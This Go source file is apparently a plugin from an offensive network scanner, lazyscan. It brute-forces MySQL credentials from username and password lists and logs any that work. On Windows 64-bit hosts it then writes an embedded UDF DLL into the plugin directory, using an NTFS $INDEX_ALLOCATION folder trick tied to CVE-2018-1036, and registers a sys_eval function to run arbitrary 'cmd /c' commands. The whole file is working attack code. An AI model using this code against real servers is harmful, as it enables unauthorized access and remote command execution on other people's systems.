package plugins

import (
	"context"
	"database/sql"
	"encoding/hex"
	"errors"
	"fmt"
	"log"
	"strings"
	"time"

	"github.com/404tk/lazyscan/common"
	"github.com/404tk/lazyscan/common/payloads"
	"github.com/404tk/lazyscan/common/utils"
	_ "github.com/go-sql-driver/mysql"
)

func MysqlScan(info *common.HostInfo) error {
	starttime := time.Now().Unix()
	for _, user := range info.Usernames {
		for _, pass := range info.Passwords {
			pass = strings.Replace(pass, "{user}", user, -1)
			flag, err := MysqlConn(info, user, pass)
			if flag == true {
				return err
			} else {
				if time.Now().Unix()-starttime > (int64(len(info.Usernames)*len(info.Passwords)) * info.Timeout) {
					return errors.New("timeout.")
				}
			}
		}
	}
	return nil
}

func MysqlConn(info *common.HostInfo, user string, pass string) (flag bool, err error) {
	dataSourceName := fmt.Sprintf("%v:%v@tcp(%v:%v)/information_schema?charset=utf8&timeout=%v", user, pass, info.Host, info.Port, time.Duration(info.Timeout)*time.Second)
	db, err := sql.Open("mysql", dataSourceName)
	if err == nil {
		db.SetConnMaxLifetime(time.Duration(info.Timeout) * time.Second)
		db.SetConnMaxIdleTime(time.Duration(info.Timeout) * time.Second)
		db.SetMaxIdleConns(0)
		defer db.Close()
		err = db.Ping()
		if err == nil {
			flag = true
			result := fmt.Sprintf("[%s:%s] MySQL credential %s/%s", info.Host, info.Port, user, pass)
			log.Println(result)
			if info.Queue != nil {
				vuln := common.Vuln{
					Host: info.Host,
					Port: info.Port,
					User: user,
					Pass: pass,
				}
				info.Queue.Push(vuln)
			}
			if info.DisableExp && info.Command == "" {
				return
			}
			ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
			defer cancel()

			type sqlresult struct {
				VariableName string
				Value        string
			}

			rows, err := db.QueryContext(ctx, "show global variables like 'version_compile_os'")
			if err == nil {
				for rows.Next() {
					var res sqlresult
					rows.Scan(&res.VariableName, &res.Value)
					// 暂时只支持Windows 64位的dll
					if res.Value == "Win64" {
						var cmd string
						if !info.DisableExp {
							cmd = info.Commands.WinCommand
						} else {
							cmd = info.Command
						}
						MysqlExec(db, cmd)
					}
				}
			}
		}
	}
	return flag, err
}

func MysqlExec(db *sql.DB, cmd string) {
	row := db.QueryRow("select @@plugin_dir")
	var pluginDir string
	row.Scan(&pluginDir)

	d := hex.EncodeToString(payloads.Mysql_udf_dll)

	q := fmt.Sprintf("select 'aaa' into dumpfile '%s\\plugin::$INDEX_ALLOCATION'", strings.Replace(pluginDir, "\\", "\\\\", -1))
	_, err := db.Exec(q)
	if err != nil {
		// CVE-2018-1036，Win10测试机器中默认已打补丁，文件夹创建可能失败
		if strings.Contains(err.Error(), "--secure-file-priv") {
			return
		}
	}
	filename := utils.RandString(6)
	dSql := fmt.Sprintf("select 0x%s into dumpfile '%s\\%s.dll'", d, strings.Replace(pluginDir, "\\", "\\\\", -1), filename)
	_, err = db.Exec(dSql)
	if err != nil {
		// 尝试UDF导出失败
		return
	}
	_, err = db.Exec(fmt.Sprintf("create function sys_eval returns string soname '%s.dll'", filename))
	if err != nil && !strings.Contains(err.Error(), "already exists") {
		// 尝试创建函数失败
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	cmd = strings.ReplaceAll(cmd, "'", "\\'")
	db.ExecContext(ctx, fmt.Sprintf("select sys_eval('cmd /c %s')", cmd))
	cancel()
	db.Exec("DROP FUNCTION sys_eval")
}
